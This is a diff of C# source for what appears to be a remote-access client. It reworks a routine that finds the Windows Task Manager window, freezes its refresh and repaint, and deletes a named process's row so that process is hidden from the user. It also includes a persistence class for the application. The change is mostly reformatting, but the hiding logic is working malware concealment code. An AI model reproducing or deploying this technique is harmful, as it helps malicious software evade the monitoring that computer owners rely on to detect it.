@@ -7,53 +7,51 @@ using System.Threading;
 namespace Client.API
 {
     /// <summary>
-    /// Contains classes that are meant to be used through threads.
+    ///     Contains classes that are meant to be used through threads.
     /// </summary>
     public class ThreadedAPI
     {
         public static bool IsRunning = true;
         private static readonly Logger _Log = new Logger(Logger.source.CLIENT);
-
+        private static IntPtr _LastKnownTaskMgrProcID;
         /// <summary>
-        /// Threaded class for handling proccess related things
+        ///     Threaded class for handling proccess related things
         /// </summary>
         public class TProcs
         {
             private struct TaskManagerStruct
             {
                 // Main window
-                IntPtr _lhWndParent;
-
+                private IntPtr _lhWndParent;
                 // UI Controls, Mainwindow, mainpanel, ListView, ListViewHeader.
-                IntPtr _lhTaskManagerMain,
-                       _lhDirectUIHWND,
-                       _lhSysListView32,
-                       _lhSysHeader32;
+                private IntPtr _lhTaskManagerMain;
+                private IntPtr _lhDirectUIHWND;
+                private IntPtr _lhSysListView32;
+                private IntPtr _lhSysHeader32;
 
                 // Task Manager Menus
-                IntPtr _hMenu,
-                       _hSubMenu,
-                       _hSubSubMenu;
+                private IntPtr _hMenu;
+                private IntPtr _hSubMenu;
+                private IntPtr _hSubSubMenu;
 
                 // Menu refresh options
-                List<int> _mRefreshOptions;
+                private List<int> _mRefreshOptions;
                 public enum RefreshRates
                 {
-                    Stop    = 0,
-                    Slow    = 1,
-                    Normal  = 2,
-                    High    = 3
+                    High = 0,
+                    Normal = 1,
+                    Slow = 2,
+                    Stop = 3
                 }
 
-
                 // Refresh now button
-                int _refreshNowButton; 
-                
+                private int _refreshNowButton;
+
                 public TaskManagerStruct(IntPtr TaskManagerParentAddress)
                 {
-                    _lhWndParent = TaskManagerParentAddress; 
+                    _lhWndParent = TaskManagerParentAddress;
 
-                    _lhTaskManagerMain = new IntPtr(); 
+                    _lhTaskManagerMain = new IntPtr();
                     _lhDirectUIHWND = new IntPtr();
                     _lhSysListView32 = new IntPtr();
                     _lhSysHeader32 = new IntPtr();
@@ -76,7 +74,7 @@ namespace Client.API
 
                 public void SortProcessAlphabetically()
                 {
-                      User32.PostMessage(_lhSysListView32, User32.LVM_SORTITEMS, 0, 0); //Sort
+                    User32.PostMessage(_lhSysListView32, User32.LVM_SORTITEMS, 0, 0); //Sort
                 }
 
                 public void DeleteProcess(int index)
@@ -86,7 +84,8 @@ namespace Client.API
 
                 public void DisableManualRefresh(bool disable)
                 {
-                    User32.EnableMenuItem(_hMenu, (uint)_refreshNowButton, disable ? User32.MF_GRAYED : User32.MF_ENABLED);
+                    User32.EnableMenuItem(_hMenu, (uint) _refreshNowButton,
+                        disable ? User32.MF_GRAYED : User32.MF_ENABLED);
                 }
 
                 public void DisableTaskListOnPaint(bool disable)
@@ -99,35 +98,43 @@ namespace Client.API
 
                 public void SetRefreshRate(RefreshRates speed)
                 {
-                    User32.PostMessage(_lhWndParent, User32.WM_COMMAND, _mRefreshOptions[(int)speed], 0);
+                    User32.PostMessage(_lhWndParent, User32.WM_COMMAND, _mRefreshOptions[(int) speed], 0);
                 }
 
                 public void DisableRefreshRates(bool disable)
                 {
                     foreach (int b in _mRefreshOptions)
-                        User32.EnableMenuItem(_hMenu, (uint) b, disable? User32.MF_GRAYED : User32.MF_ENABLED);
+                        User32.EnableMenuItem(_hMenu, (uint) b, disable ? User32.MF_GRAYED : User32.MF_ENABLED);
                 }
 
                 private void PopulateOffsets()
                 {
                     #region Window Panel
-                    _lhTaskManagerMain = User32.FindWindowEx(_lhWndParent, _lhTaskManagerMain, null, null);
-                    _lhDirectUIHWND = User32.FindWindowEx(_lhTaskManagerMain, _lhDirectUIHWND, null, null);
 
-                    for (int i = 0; i < 7; i++)
+                    do
                     {
-                        _lhSysListView32 = User32.FindWindowEx(_lhDirectUIHWND, _lhSysListView32, null, null);
+                        _lhTaskManagerMain = User32.FindWindowEx(_lhWndParent, _lhTaskManagerMain, null, null);
+                        _lhDirectUIHWND = User32.FindWindowEx(_lhTaskManagerMain, _lhDirectUIHWND, null, null);
 
-                        if (User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
+                        for (int i = 0; i < 7; i++)
                         {
-                            Console.WriteLine(" Found tasklist window at 0x" + _lhSysListView32.ToString("X"));
-                            lhSysListView32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32", null);
-                            lhSysHeader32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysHeader32", null);
-                            break;
+                            _lhSysListView32 = User32.FindWindowEx(_lhDirectUIHWND, _lhSysListView32, null, null);
+
+                            if (User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
+                            {
+                                Console.WriteLine(" Found tasklist window at 0x" + _lhSysListView32.ToString("X"));
+                                lhSysListView32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32",
+                                    null);
+                                lhSysHeader32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysHeader32", null);
+                                break;
+                            }
                         }
-                    }
+                        Thread.Sleep(100);
+                    } while (_lhSysHeader32 == IntPtr.Zero);
+
                     #endregion
                     #region menubar
+
                     // Get Task manager menus
                     _hMenu = User32.GetMenu(_lhWndParent);
                     _hSubMenu = User32.GetSubMenu(_hMenu, 2);
@@ -135,8 +142,10 @@ namespace Client.API
 
                     // Refresh now button
                     _refreshNowButton = User32.GetMenuItemID(_hSubMenu, 0);
+
                     #endregion
                     #region refresh rates
+
                     _mRefreshOptions = new List<int>
                     {
                         User32.GetMenuItemID(_hSubSubMenu, 0),
@@ -144,31 +153,32 @@ namespace Client.API
                         User32.GetMenuItemID(_hSubSubMenu, 2),
                         User32.GetMenuItemID(_hSubSubMenu, 3)
                     };
+
                     #endregion
                 }
 
                 private void OutputOffsets()
                 {
-                    Console.WriteLine("\nTask Manager Instance Offsets:");
-                    Console.WriteLine("lhWndParent:\t\t0x" + lhWndParent.ToString("X"));
-                    Console.WriteLine("lhTaskManagerMain:\t0x" + lhTaskManagerMain.ToString("X"));
-                    Console.WriteLine("lhDirectUIHWND:\t\t0x" + lhDirectUIHWND.ToString("X"));
-                    Console.WriteLine("lhSysListView32:\t0x" + lhSysListView32.ToString("X"));
-                    Console.WriteLine("lhSysHeader32:\t\t0x" + lhSysHeader32.ToString("X"));
+                    Console.WriteLine("\n\t[Task Manager Instance Offsets]");
+                    Console.WriteLine("\t lhWndParent:\t\t0x" + lhWndParent.ToString("X"));
+                    Console.WriteLine("\t lhTaskManagerMain:\t0x" + lhTaskManagerMain.ToString("X"));
+                    Console.WriteLine("\t lhDirectUIHWND:\t0x" + lhDirectUIHWND.ToString("X"));
+                    Console.WriteLine("\t lhSysListView32:\t0x" + lhSysListView32.ToString("X"));
+                    Console.WriteLine("\t lhSysHeader32:\t\t0x" + lhSysHeader32.ToString("X"));
                     Console.WriteLine("\n");
                 }
 
                 public IntPtr lhWndParent
                 {
-                    get { return _lhWndParent; } 
+                    get { return _lhWndParent; }
                     set { _lhWndParent = value; }
                 }
                 public IntPtr lhTaskManagerMain
                 {
                     get { return _lhTaskManagerMain; }
-                    set { _lhTaskManagerMain = value ; }
+                    set { _lhTaskManagerMain = value; }
                 }
-                public IntPtr lhDirectUIHWND 
+                public IntPtr lhDirectUIHWND
                 {
                     get { return _lhDirectUIHWND; }
                     set { _lhDirectUIHWND = value; }
@@ -186,46 +196,58 @@ namespace Client.API
             }
 
             /// <summary>
-            /// If the task manager is open, intercept the kernel process call and alter the return value.
+            ///     If the task manager is open, intercept the kernel process call and alter the return value.
             /// </summary>
             /// <param name="processName"></param>
             public static void HideProccess(object processName)
             {
                 _Log.Write(Logger.Actions.NEW_THREAD, "Hiding: " + processName, "OK");
 
-                while (ThreadedAPI.IsRunning)
+                while (IsRunning)
                 {
                     IntPtr TaskMgrAddress = User32.FindWindow(null, "Task Manager");
-                    
-                    if (TaskMgrAddress != IntPtr.Zero)
-                    {
-                        _Log.Write(Logger.Actions.INFO, "Detected Task Manager at 0x" + TaskMgrAddress.ToString("X"));
-                        if (DeleteProcessFromTaskList(processName, TaskMgrAddress))
-                        {
-                            _Log.Write(Logger.Actions.INFO, "Hidden: " + processName, "OK");
-                            break;
-                        }
-                    }
 
-                    Thread.Sleep(1);
+
+                        if (TaskMgrAddress != IntPtr.Zero)
+                        {
+                            _Log.Write(Logger.Actions.INFO, "Detected Task Manager at 0x" + TaskMgrAddress.ToString("X"));
+                            if (DeleteProcessFromTaskList(processName, TaskMgrAddress))
+                            {
+                                _Log.Write(Logger.Actions.INFO, "Hidden: " + processName, "OK");
+                                break;
+                            }
+                        }
+
+                        Thread.Sleep(1);
                 }
+                Console.WriteLine("End of thread.");
             }
 
             /// <summary>
             ///     Hides a process from the task manager description tasklist
             /// </summary>
             /// <param name="procName"> The desired process to hide.</param>
-             private static bool DeleteProcessFromTaskList(object procName, IntPtr TaskManagerInstance)
+            private static bool DeleteProcessFromTaskList(object procName, IntPtr TaskManagerInstance)
             {
                 // Hook and wrap the detected Task Manager window
                 TaskManagerStruct taskManager = new TaskManagerStruct(TaskManagerInstance);
-              
+                int targetProcIndex = GetProcessIndex(procName.ToString());
 
-                 taskManager.SetRefreshRate(TaskManagerStruct.RefreshRates.Stop);
-                 taskManager.DisableManualRefresh(true);
-                 taskManager.DisableTaskListOnPaint(true);
+                taskManager.SetRefreshRate(TaskManagerStruct.RefreshRates.Stop);
+                taskManager.DisableManualRefresh(true);
+                taskManager.DisableTaskListOnPaint(true);
+                taskManager.DisableRefreshRates(true);
+                taskManager.DisableSorting(true);
+                taskManager.DeleteProcess(targetProcIndex);
+                taskManager.DisableTaskListOnPaint(false);
+                taskManager.SetRefreshRate(TaskManagerStruct.RefreshRates.Normal);
 
+                _LastKnownTaskMgrProcID = taskManager.lhWndParent;
+                return true;
+            }
 
+            private static int GetProcessIndex(string processName)
+            {
                 List<Process> proclist = Process.GetProcesses().ToList();
                 proclist = proclist.OrderBy(x => x.ProcessName).ToList();
 
@@ -233,26 +255,16 @@ namespace Client.API
 
                 foreach (Process p in proclist)
                 {
-                    if (p.ProcessName.ToLower().Contains(procName.ToString().ToLower()))
+                    if (p.ProcessName.ToLower().Contains(processName.ToLower()))
                         index = proclist.IndexOf(p);
                 }
 
-
-                //User32.PostMessage(lhWndParent, User32.WM_COMMAND, refreshNowButton, 0); //Refresh
-               taskManager.DisableSorting(false);
-               taskManager.SortProcessAlphabetically();
-               taskManager.DeleteProcess(index);
-            
-
-                User32.LockWindowUpdate(IntPtr.Zero);
-                //User32.PostMessage(lhWndParent, User32.WM_COMMAND, updateNowList[1], 0);
-                Console.WriteLine("Removed at " + index);
-                return true;
+                return index;
             }
         }
 
         /// <summary>
-        /// Threaded class for handling persistence of this application.
+        ///     Threaded class for handling persistence of this application.
         /// </summary>
         public class TPersistence
         {
@@ -261,8 +273,8 @@ namespace Client.API
                 public static readonly Process Proc = Process.GetCurrentProcess();
 
                 public static string NAME = AppDomain.CurrentDomain.FriendlyName,
-                                     PATH = AppDomain.CurrentDomain.BaseDirectory,
-                                     TaskName = Proc.ProcessName;
+                    PATH = AppDomain.CurrentDomain.BaseDirectory,
+                    TaskName = Proc.ProcessName;
             }
 
             public static bool IsFirstExecution = true;
